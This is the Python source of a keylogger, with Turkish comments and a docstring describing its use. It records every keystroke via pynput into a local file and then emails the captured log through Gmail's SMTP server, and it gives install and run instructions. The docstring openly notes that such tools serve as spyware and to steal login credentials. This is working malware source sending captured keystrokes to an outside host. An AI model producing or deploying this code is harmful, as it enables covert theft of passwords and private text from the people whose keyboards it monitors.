'''
Keylogger'lar, klavyede bastığınız tuşları kaydeden programlardır. Bu programlar, klavyede bastığınız her şeyi kayıt altına alabilir
    ve kötü niyetli amaçlarla, örneğin casus yazılım olarak veya giriş bilgilerini çalmak için kullanılabilir.

Günümüzdeki keylogger'lar birçok işlevselliğe sahiptir. Her tuş vuruşunun tam tarih ve saatini kaydederler,
    tuş vuruşlarının hangi uygulamada girildiğini gösterirler, kolay okunabilir günlükler oluştururlar vb.

Bu program ise sınırlı işlevselliğe sahip basit bir keylogger'dır ve işlevleri şunlardır:
-> Tuş vuruşlarını "keylogger.txt" adlı bir dosyaya kaydetmek
-> Dosyanın içeriğini belirli bir e-posta adresine göndermek (gönderen e-posta Gmail, iki aşamalı doğrulama olmadan)

Çalıştırmak için: Dosyayı terminalde açıp "python keylogger.py" komutunu girin.
Çıkmak için: Esc tuşuna basarak keylogger'ı durdurabilirsiniz.

Kullanılan Modüller:
-> smtplib (Python'da önceden kurulu olarak gelir)
-> ssl (Python'da önceden kurulu olarak gelir)
-> pynput (Yüklemek için "pip install pynput" komutunu kullanın)
'''

# İnternette SMTP veya ESMTP dinleyici daemon'u olan herhangi bir makineye posta göndermek için bir SMTP istemci oturumu nesnesi tanımlar
import smtplib
# TLS/SSL şifreleme ve ağ soketleri için eş kimlik doğrulama işlevlerine erişim sağlar
import ssl
# Girdi cihazlarını (fare ve klavye) kontrol etmeye ve izlemeye olanak tanır
from pynput import keyboard

# user@domain.com yerine e-posta adresinizi yazın (her yerde geçerli)
gonderen_mail = "user@domain.com"
# Alıcı olarak da kendi e-posta adresinizi kullanmanız önerilir.
# user@domain.com yerine e-posta adresinizi yazın (her yerde geçerli)
alici_mail = "user@domain.com"
parola = "parola"             # Buraya şifrenizi girin
port = 587
mesaj = """From: user@domain.com
To: user@domain.com                         
Subject: KeyLogs
Text: Keylogger Kayıtları
"""


def yazi_yaz(metin):
    with open("keylogger.txt", 'a') as dosya:
        dosya.write(metin)
        dosya.close()


def tus_basildi(tus):
    try:
        if tus == keyboard.Key.enter:
            yazi_yaz("\n")
        else:
            yazi_yaz(tus.char)
    except AttributeError:
        if tus == keyboard.Key.backspace:
            yazi_yaz("\nGeri Tuşuna Basıldı\n")
        elif tus == keyboard.Key.tab:
            yazi_yaz("\nSekme Tuşuna Basıldı\n")
        elif tus == keyboard.Key.space:
            yazi_yaz(" ")
        else:
            temp = repr(tus) + " Tuşuna Basıldı.\n"
            yazi_yaz(temp)
            print("\n{} Tuşuna Basıldı\n".format(tus))


def tus_birakildi(tus):
    # Bu, Listener/Keylogger'ı durdurur.
    # İstediğiniz bir tuşu seçmek için "esc" yerine başka bir tuş yazabilirsiniz.
    if tus == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=tus_basildi, on_release=tus_birakildi) as dinleyici:
    dinleyici.join()

with open("keylogger.txt", 'r') as dosya:
    temp = dosya.read()
    mesaj = mesaj + str(temp)
    dosya.close()

context = ssl.create_default_context()
sunucu = smtplib.SMTP('smtp.gmail.com', port)
sunucu.starttls()
sunucu.login(gonderen_mail, parola)
sunucu.sendmail(gonderen_mail, alici_mail, mesaj)
print("E-posta Gönderildi: ", gonderen_mail)
sunucu.quit()
